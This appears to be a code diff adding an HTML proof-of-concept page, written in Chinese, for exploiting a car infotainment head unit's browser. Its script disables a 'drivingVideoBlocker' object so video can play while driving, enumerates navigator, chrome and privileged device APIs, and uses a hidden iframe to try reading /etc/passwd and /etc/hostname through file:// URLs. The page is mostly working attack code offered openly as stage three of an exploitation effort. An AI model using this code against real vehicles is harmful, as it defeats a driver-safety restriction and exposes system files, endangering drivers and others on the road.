@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>车机深度利用 POC - 阶段3</title>
+    <style>
+        body { font-family: Arial, sans-serif; padding: 20px; background: #f0f0f0; color: #333; }
+        .section { background: #fff; padding: 15px; margin-bottom: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        pre { background: #1e1e1e; color: #d4d4d4; padding: 10px; white-space: pre-wrap; word-wrap: break-word; max-height: 300px; overflow-y: auto; }
+        button { padding: 8px 15px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; margin-right: 10px; margin-bottom: 10px; }
+        button:hover { background: #0056b3; }
+        video { width: 100%; max-width: 600px; border: 1px solid #ccc; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <h2>车机深度利用 POC - 阶段3</h2>
+
+    <!-- 模块1：行车安全限制绕过测试 -->
+    <div class="section">
+        <h3>1. 行车视频限制绕过测试</h3>
+        <p>尝试篡改 drivingVideoBlocker 对象，在行车状态下解锁视频播放。</p>
+        <button onclick="bypassDrivingBlock()">尝试绕过视频限制</button>
+        <br>
+        <video id="test-video" controls>
+            <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+            您的浏览器不支持 video 标签。
+        </video>
+        <pre id="bypass-result">等待执行...</pre>
+    </div>
+
+    <!-- 模块2：深层接口枚举 -->
+    <div class="section">
+        <h3>2. 深层接口与原型链枚举</h3>
+        <p>深入挖掘 navigator、chrome 对象及原生对象的原型链。</p>
+        <button onclick="deepEnumerate()">开始深层枚举</button>
+        <pre id="deep-result">等待执行...</pre>
+    </div>
+
+    <!-- 模块3：Iframe 跨域文件读取测试 -->
+    <div class="section">
+        <h3>3. Iframe 跨域文件读取测试</h3>
+        <p>利用 iframe 加载本地文件，测试同源策略是否生效。</p>
+        <button onclick="testIframeFileRead('file:///etc/hostname')">测试读取 /etc/hostname</button>
+        <button onclick="testIframeFileRead('file:///etc/passwd')">测试读取 /etc/passwd</button>
+        <pre id="iframe-result">等待执行...</pre>
+    </div>
+
+    <script>
+        // ========== 模块1：行车安全限制绕过 ==========
+        function bypassDrivingBlock() {
+            const resultDiv = document.getElementById('bypass-result');
+            const video = document.getElementById('test-video');
+            resultDiv.textContent = "当前 drivingVideoBlocker 状态:\n" + JSON.stringify(window.drivingVideoBlocker, null, 2) + "\n\n";
+            
+            try {
+                // 尝试直接修改属性
+                if (window.drivingVideoBlocker) {
+                    window.drivingVideoBlocker.isBlocking = false;
+                    window.drivingVideoBlocker.blockText = "Bypassed by XSS";
+                    
+                    // 尝试删除或覆盖 overlays
+                    window.drivingVideoBlocker.overlays = null;
+                    
+                    resultDiv.textContent += "修改后的状态:\n" + JSON.stringify(window.drivingVideoBlocker, null, 2) + "\n\n";
+                    resultDiv.textContent += "尝试播放视频...\n";
+                    
+                    // 尝试播放视频
+                    video.play().then(() => {
+                        resultDiv.textContent += "视频播放成功！行车限制可能已被绕过！\n";
+                    }).catch(err => {
+                        resultDiv.textContent += "视频播放失败: " + err.message + "\n";
+                    });
+                } else {
+                    resultDiv.textContent += "drivingVideoBlocker 对象不存在。\n";
+                }
+            } catch (err) {
+                resultDiv.textContent += "操作异常: " + err.message + "\n";
+            }
+        }
+
+        // ========== 模块2：深层接口枚举 ==========
+        function deepEnumerate() {
+            let results = [];
+            
+            // 1. 枚举 navigator 属性
+            results.push("=== Navigator 属性 ===");
+            for (let prop in navigator) {
+                try {
+                    if (typeof navigator[prop] !== 'function') {
+                        let val = String(navigator[prop]).substring(0, 100);
+                        results.push(`navigator.${prop} = ${val}`);
+                    }
+                } catch(e) {}
+            }
+
+            // 2. 枚举 window.chrome 对象 (车机定制内核可能在此注入接口)
+            results.push("\n=== window.chrome 对象 ===");
+            if (window.chrome) {
+                for (let prop in window.chrome) {
+                    results.push(`chrome.${prop} (${typeof window.chrome[prop]})`);
+                }
+            } else {
+                results.push("window.chrome 不存在");
+            }
+
+            // 3. 枚举 drivingVideoBlocker 的原型链
+            results.push("\n=== drivingVideoBlocker 原型链与方法 ===");
+            if (window.drivingVideoBlocker) {
+                let obj = window.drivingVideoBlocker;
+                let proto = Object.getPrototypeOf(obj);
+                if (proto) {
+                    let methods = Object.getOwnPropertyNames(proto);
+                    results.push("原型方法: " + methods.join(", "));
+                }
+                
+                // 尝试查找所有可执行的方法
+                for (let prop in obj) {
+                    if (typeof obj[prop] === 'function') {
+                        results.push(`[Method] drivingVideoBlocker.${prop}`);
+                    }
+                }
+            }
+
+            // 4. 探测高权限 API
+            results.push("\n=== 高权限 API 探测 ===");
+            results.push("navigator.clipboard: " + (navigator.clipboard ? "存在" : "不存在"));
+            results.push("navigator.usb: " + (navigator.usb ? "存在" : "不存在"));
+            results.push("navigator.serial: " + (navigator.serial ? "存在" : "不存在"));
+            results.push("navigator.bluetooth: " + (navigator.bluetooth ? "存在" : "不存在"));
+            results.push("navigator.serviceWorker: " + (navigator.serviceWorker ? "存在" : "不存在"));
+
+            document.getElementById('deep-result').textContent = results.join('\n');
+        }
+
+        // ========== 模块3：Iframe 跨域读取 ==========
+        function testIframeFileRead(filePath) {
+            const resultDiv = document.getElementById('iframe-result');
+            resultDiv.textContent = `尝试通过 Iframe 读取: ${filePath}...\n`;
+            
+            let iframe = document.createElement('iframe');
+            iframe.style.width = '0';
+            iframe.style.height = '0';
+            iframe.style.border = '0';
+            iframe.style.display = 'none';
+            
+            iframe.onload = function() {
+                try {
+                    // 尝试读取 iframe 的内容，如果同源策略失效，这里能拿到数据
+                    let content = iframe.contentDocument.body.innerText;
+                    resultDiv.textContent += "读取成功！同源策略可能未生效！\n\n";
+                    resultDiv.textContent += "文件内容:\n" + content;
+                } catch (err) {
+                    resultDiv.textContent += "读取失败: " + err.message + "\n";
+                    resultDiv.textContent += "同源策略生效，无法跨域读取。\n";
+                }
+                document.body.removeChild(iframe);
+            };
+            
+            iframe.onerror = function() {
+                resultDiv.textContent += "Iframe 加载失败。\n";
+                document.body.removeChild(iframe);
+            };
+            
+            iframe.src = filePath;
+            document.body.appendChild(iframe);
+        }
+    </script>
+</body>
+</html>
